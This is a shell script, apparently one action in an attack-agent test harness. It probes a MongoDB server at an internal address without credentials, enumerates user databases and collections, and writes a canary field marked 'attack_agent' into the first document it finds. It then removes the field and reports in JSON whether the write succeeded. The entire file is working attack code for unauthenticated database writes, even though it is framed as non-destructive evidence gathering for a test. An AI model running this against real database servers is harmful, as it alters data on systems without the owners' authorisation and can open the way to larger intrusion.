#!/usr/bin/env sh
# subdb_canary (INJECT): Mongo write 가능성 증빙용 canary set/unset.
# 성공 시 accepted=true + effect.subscriber_written=true, 항상 정리(unset) 시도.
set -eu

emit_blocked() {
  printf '%s\n' '{"accepted":false,"blocked_by":"auth","effect":{},"signed":null}'
}

if ! command -v mongosh >/dev/null 2>&1; then
  emit_blocked
  exit 0
fi

HOST="${MONGO_HOST:-10.44.0.2}"
PORT="${MONGO_PORT:-27017}"
TIMEOUT_S="${TIMEOUT_S:-8}"
CANARY_FIELD="_dah_canary"
CANARY_VAL="attack_agent"

JS='(function(){
  const skip = new Set(["admin","local","config"]);
  const names = db.getMongo().getDBNames();
  for (const dbName of names) {
    if (skip.has(dbName)) continue;
    const d = db.getSiblingDB(dbName);
    for (const cName of d.getCollectionNames()) {
      const doc = d.getCollection(cName).findOne({});
      if (!doc || !doc._id) continue;
      return JSON.stringify({db:dbName, col:cName, id:doc._id});
    }
  }
  return "";
})()'

TARGET="$(timeout "$TIMEOUT_S" mongosh --quiet --host "$HOST" --port "$PORT" --eval "$JS" 2>/dev/null || true)"
if [ -z "${TARGET:-}" ]; then
  printf '%s\n' '{"accepted":false,"blocked_by":"no_effect","effect":{},"signed":null}'
  exit 0
fi

DB_NAME="$(printf '%s' "$TARGET" | python - <<'PY'
import json,sys
s=sys.stdin.read().strip()
try:
 d=json.loads(s)
 print(d.get('db',''))
except Exception:
 print('')
PY
)"
COL_NAME="$(printf '%s' "$TARGET" | python - <<'PY'
import json,sys
s=sys.stdin.read().strip()
try:
 d=json.loads(s)
 print(d.get('col',''))
except Exception:
 print('')
PY
)"
DOC_ID="$(printf '%s' "$TARGET" | python - <<'PY'
import json,sys
s=sys.stdin.read().strip()
try:
 d=json.loads(s)
 v=d.get('id')
 print(str(v) if v is not None else '')
except Exception:
 print('')
PY
)"

if [ -z "$DB_NAME" ] || [ -z "$COL_NAME" ] || [ -z "$DOC_ID" ]; then
  printf '%s\n' '{"accepted":false,"blocked_by":"no_effect","effect":{},"signed":null}'
  exit 0
fi

cleanup() {
  timeout "$TIMEOUT_S" mongosh --quiet --host "$HOST" --port "$PORT" --eval "db.getSiblingDB('$DB_NAME').getCollection('$COL_NAME').updateOne({_id: ObjectId('$DOC_ID')}, {\$unset: {'$CANARY_FIELD': ''}})" >/dev/null 2>&1 || true
}
trap cleanup EXIT

set +e
timeout "$TIMEOUT_S" mongosh --quiet --host "$HOST" --port "$PORT" --eval "db.getSiblingDB('$DB_NAME').getCollection('$COL_NAME').updateOne({_id: ObjectId('$DOC_ID')}, {\$set: {'$CANARY_FIELD': '$CANARY_VAL'}})" >/dev/null 2>&1
RC=$?
set -e

if [ "$RC" -eq 0 ]; then
  printf '%s\n' '{"accepted":true,"blocked_by":null,"effect":{"subscriber_written":"true"},"signed":null}'
else
  emit_blocked
fi
